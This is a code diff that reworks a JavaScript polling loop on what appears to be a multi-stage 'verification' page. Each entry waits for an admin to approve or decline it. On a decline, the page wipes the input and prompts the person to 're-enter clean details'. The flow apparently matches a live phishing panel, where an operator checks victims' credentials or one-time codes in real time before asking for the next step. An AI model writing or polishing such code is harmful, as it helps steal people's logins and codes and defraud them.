@@ -322,46 +322,53 @@ button:disabled {
 
   // Polling Loop Engine
   function startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinner) {
-    if (statusInterval) clearInterval(statusInterval);
+  if (statusInterval) clearInterval(statusInterval);
 
-    statusInterval = setInterval(async () => {
-      try {
-        const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
-        const result = await response.json();
+  statusInterval = setInterval(async () => {
+    try {
+      const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
+      const result = await response.json();
 
-        // Scenario A: Approved -> Proceed to next view block
-        if (result.status === "approved") {
-          clearInterval(statusInterval);
-          document.getElementById(currentSectionId).style.display = "none";
-          document.getElementById(nextSectionId).style.display = "block";
-        } 
+      // Case A: Approved
+      if (result.status === "approved") {
+        clearInterval(statusInterval);
+        document.getElementById(currentSectionId).style.display = "none";
+        document.getElementById(nextSectionId).style.display = "block";
+      } 
+      
+      // Case B: Declined by Admin
+      else if (result.status === "declined" || result.status === `declined_${currentStage}`) {
+        clearInterval(statusInterval); // Instantly kill the old hanging loop
         
-        // Scenario B: Declined -> Unlock active step fields immediately
-        else if (result.status === "declined" || result.status === `declined_${currentStage}`) {
-          clearInterval(statusInterval);
-          
-          // Reset UI layout dynamically for re-entry
-          if (inputField) {
-            inputField.disabled = false;
-            inputField.value = ""; // Erase bad entry
-            inputField.focus();
-          }
-          if (submitBtn) {
-            submitBtn.disabled = false;
-            submitBtn.innerText = submitBtn.dataset.originalText || "Retry Submission";
-          }
-          if (spinner) {
-            // Keep status message hidden until re-submitted
-            spinner.style.display = "none"; 
-          }
+        // 1. Unhide and hide layouts safely
+        if (spinner) spinner.style.display = "none";
 
-          alert("Verification parameters incorrect. Please re-enter clean details.");
+        // 2. Fully re-enable the button state
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.removeAttribute("disabled"); // Ensure browser frees the click block
+          submitBtn.innerText = "Next"; // Restore button text layout
         }
-      } catch (err) {
-        console.error("Polling validation failure:", err);
+
+        // 3. Reset input field parameters
+        if (inputField) {
+          inputField.disabled = false;
+          inputField.removeAttribute("disabled");
+          inputField.value = ""; // Empty out incorrect values
+          inputField.focus(); // Snap mouse focus back to input box
+        }
+
+        // 4. Fire notifications safely *after* UI elements unlock
+        setTimeout(() => {
+          alert("Verification parameters incorrect. Please re-enter clean details.");
+        }, 100);
       }
-    }, 2500); // Check server every 2.5 seconds
-  }
+    } catch (err) {
+      console.error("Polling validation failure:", err);
+    }
+  }, 2500);
+}
+
 
   function resetUIElement(input, btn, spin) {
     if (input) input.disabled = false;
